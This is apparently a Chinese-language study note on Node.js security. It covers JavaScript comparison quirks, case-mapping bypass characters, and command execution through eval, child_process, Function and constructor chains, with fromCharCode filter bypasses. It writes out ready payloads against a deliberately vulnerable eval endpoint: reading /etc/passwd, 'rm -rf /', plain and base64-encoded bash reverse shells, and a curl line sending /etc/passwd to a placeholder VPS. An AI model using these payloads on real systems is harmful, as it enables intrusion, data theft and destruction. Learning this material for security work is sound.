---
title: node.js漏洞学习
date: 2025-09-24 16:35:47
tags:
- node.js
category:
- 学习笔记
---

# node.js漏洞学习

参考链接：

https://blog.csdn.net/ing_end/article/details/124773143

https://blog.csdn.net/unexpectedthing/article/details/123056177?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-4-123056177-blog-95354288.235%5Ev43%5Epc_blog_bottom_relevance_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-4-123056177-blog-95354288.235%5Ev43%5Epc_blog_bottom_relevance_base1&utm_relevant_index=8

https://blog.csdn.net/2202_75361164/article/details/137228896

# 各数据类型比较

**与php比较相似**

### 字符串的比较

```
console.log(1=='1'); //true
console.log(1>'2'); //false
console.log('1'<'2'); //true
console.log(111>'3'); //true
console.log("ad">"v") //false
console.log('asd'>1); //false
```

**总结：**

1. **数字与字符串比较：会优先将纯数字型字符串转为数字然后再进行比较**
2. **字符串与字符串比较：会将字符串的第一个字符转为ASCII码之后再进行比较；**
3. **非数字字符串与任何数字进行比较都是false。**

---

### 数组的比较

```
console.log([]==[]); //false
console.log([]>[]); //false
console.log([]>[]); //false
console.log([6,2]>[5]); //true
console.log([100,2]<'test'); //true
console.log([1,2]<'2');  //true
console.log([11,16]<"10"); //false
```

**总结：**

1. **空数组之间比较永远为false**
2. **数组与非数值型字符串比较，数组永远小于非数值型字符串**
3. **数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较。**

---

### 特殊类型比较

```
console.log(null==undefined) // 输出true
console.log(null===undefined) // 输出false
console.log(NaN==NaN) // 输出false
console.log(NaN===NaN) // 输出false
```

# javascript大小写特性

在javascript中有几个特殊的字符需要记录一下

**对于toUpperCase():**

字符"ı"、“ſ” 经过toUpperCase处理后结果为 “I”、“S”

**对于toLowerCase():**

字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
 在绕一些规则的时候就可以利用这几个特殊字符进行绕过

---

# js命令执行

### eval()

eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数类似

```
var express = require("express");
var app = express();

app.get('/eval',function(req,res){
res.send(eval(req.query.q));//通过res.send（）方法，可以把处理好的内容，发送给客户端:

console.log(req.query.q);
})

var server = app.listen(8888, function() {
console.log("应用实例，访问地址为 http://127.0.0.1:8888/");
})

```

这串代码存在命令执行漏洞

```
# 读取服务器文件
http://127.0.0.1:8888/eval?q=require('fs').readFileSync('/etc/passwd','utf8')

# 执行系统命令
http://127.0.0.1:8888/eval?q=require('child_process').execSync('rm -rf /')

# 反弹shell
http://127.0.0.1:8888/eval?q=require('child_process').execSync('bash -i >& /dev/tcp/攻击者IP/端口 0>&1')
```

---

### chile_process.exec

Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造`require('child_process').exec('');`来进行调用。

**弹出计算器（windows）：**

```
/eval?q=require('child_process').exec('calc');
```

**读取文件(linux)：**

```
/eval?q=require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://vps');;

/eval?q=require('fs').readFileSync('/etc/passwd','utf8')
```

**反弹shell(linux)：**

```
/eval?q=require('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash');

YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i >& /dev/tcp/127.0.0.1/3333 0>&1 BASE64加密后的结果，直接调用会报错。

注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
```

如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用`global.process.mainModule.constructor._load('child_process').exec('calc')`来执行命令

---

**类似命令**

间隔两秒执行函数：

```
setInteval(some_function, 2000)
```

两秒后执行函数：

```
setTimeout(some_function, 2000);
```

some_function处就类似于eval函数的参数

输出HelloWorld：

```
Function(“console.log(‘HelloWolrd’)”){}
```

类似于php中的create_function

以上都可以导致命令执行

### Function

在node.js中的Function类似于php的create_function

```
let a = Function("return process.mainModule.require('child_process').execSync('whoami').toString()")
console.log(a())

//console.log(Function("return process.mainModule.require('child_process').execSync('whoami').toString()")())
```

成功执行whoami命令

---

**在js中每个javascript函数都是一个Function对象，可以动态的创建一个函数**

```
String.constructor
//[Function: Function]

"a".constructor
//[Function: String]

"a".constructor.constructor
//[Function: Function]

Math.constructor
//[Function: Object]

Math.constructor.constructor
//[Function: Function]

{}.constructor.constructor
//[Function: Function]
```

所以最终通过constructor构造函数属性，我们可以不使用Function关键字也能拿到Function实现效果

```
let a='a'.constructor.constructor
console.log(a("return process.mainModule.require('child_process').execSync('whoami').toString()")())

let b=Math.constructor.constructor
console.log(b("return process.mainModule.require('child_process').execSync('whoami').toString()")())

let d=Math.constructor.constructor
console.log(d("return process.mainModule.require('child_process').execSync('whoami').toString()")())
```

---

### spawn

在 Node.js 中，`spawn` 是 `child_process` 模块提供的一个函数，用于创建子进程来执行外部命令。与 `exec` 相比，`spawn` 更适合处理大量数据流，因为它使用流（stream）的方式处理输入输出。

基本语法：

**1、引入模块**

```
const { spawn } = require('child_process');
```

**2、基本示例**

```
// 执行简单的命令
const ls = spawn('ls', ['-lh', '/usr']);

ls.stdout.on('data', (data) => {
  console.log(`输出: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`错误: ${data}`);
});

ls.on('close', (code) => {
  console.log(`子进程退出，退出码: ${code}`);
});
```

**常用参数**

```
spawn(command[, args][, options])
```

- `command`: 要运行的命令
- `args`: 参数数组
- `options`: 配置选项

**选项配置**

```
const options = {
  cwd: '/path/to/working/directory',  // 工作目录
  env: { ...process.env, CUSTOM_VAR: 'value' },  // 环境变量
  stdio: 'pipe',  // 标准流配置
  detached: false,  // 是否让子进程独立于父进程
  uid: 1000,  // 用户ID
  gid: 1000,  // 组ID
  shell: false  // 是否使用shell执行
};

const child = spawn('command', ['arg1', 'arg2'], options);
```

---

示例：

使用shell执行复杂命令

```
const { spawn } = require('child_process');

// 使用 shell 执行管道命令
const shellCommand = spawn('ls -la | grep node', {
  shell: true,
  stdio: 'inherit'  // 继承父进程的stdio
});
```

---

### exec和execSync的区别

`execSync` - 同步执行，直接返回结果

```
const result = require('child_process').execSync('whoami');
console.log(result.toString()); // 直接输出命令结果
// 输出: root\n
```

`exec` - 异步执行，通过回调获取结果

```
require('child_process').exec('whoami', (error, stdout, stderr) => {
    console.log(stdout); // 在回调中获取结果
});
```

---

## 绕过

### **toString**

当toString被过滤时，我们可以使用使用String.fromCharCode()函数代替

#### **String.fromCharCode()**

`String.fromCharCode()` 是一个 JavaScript 函数，它根据指定的 Unicode 值序列创建一个字符串。这个函数接受一个或多个 Unicode 值作为参数，并返回一个由这些 Unicode 值组成的字符串。

例如：

```
console.log(String.fromCharCode(72, 69, 76, 76, 79))//HELLO
```

**可以利用python脚本构造String.fromCharCode()**

```
def gen(cmd):  
s = f"return process.mainModule.require('child_process').execSync('{cmd}').toString()"  
return ','.join([str(ord(i)) for i in s])  
  
print('String.fromCharCode('+gen('whoami')+')')

# String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,119,104,111,97,109,105,39,41,46,116,111,83,116,114,105,110,103,40,41)
```

**利用String.fromCharCode()配合Function进行命令执行**

```
let c=Math.constructor.constructor  
console.log(c(String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,119,104,111,97,109,105,39,41,46,116,111,83,116,114,105,110,103,40,41)  
)())
```

成功执行whoami
 **但是一般toString不能用，String肯定也不能用所以可以通过’a’.constructor得到String对象**

```
let c=Math.constructor.constructor
let s='a'.constructor
console.log(c(s.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,119,104,111,97,109,105,39,41,46,116,111,83,116,114,105,110,103,40,41)
)())
```

### 箭头函数（匿名函数）

`=>`是箭头函数（匿名函数）其类似其类似 `(参数1, 参数2, …, 参数N) => { return 函数返回语句内容 } ` ，调用的话可以看下面的例子（如果参数为单个的话就不需要括号了）

例如：

```
add=(a,b)=>{return a+b}
//[Function: add]
add(2,3)
//5

当只有单个参数时可以不用括号
a=a=>{return a+a}
//[Function: a]
a(1)
//2

调用
(add=(a,b)=>{return a+b})(1,2)
//3
```

### 自调用:`(()=>())()`

可以使用()代替{

1、不需要return

2、和{}的写法有所不同

3、`(参数1, 参数2, …, 参数N) => ( 语句1，语句2，语句3…… ) `，执行顺序从左到右，已最右边的语句结果作为返回值

例如：

```
((a,b)=>(a+b))(1,2)
//3

((a,b)=>(a=100,b+a))(1,2)
//102

((a,b)=>(a=100,b=100,b+a))(1,2)
//200

((a,b)=>(a=100,b=100,b=b+a))(1,2)
//200
```

写单个参数的时候也不用括号

```
(a=>a+a)(1)
//2

(a=>(a=100,a+a))(1)
//200
```































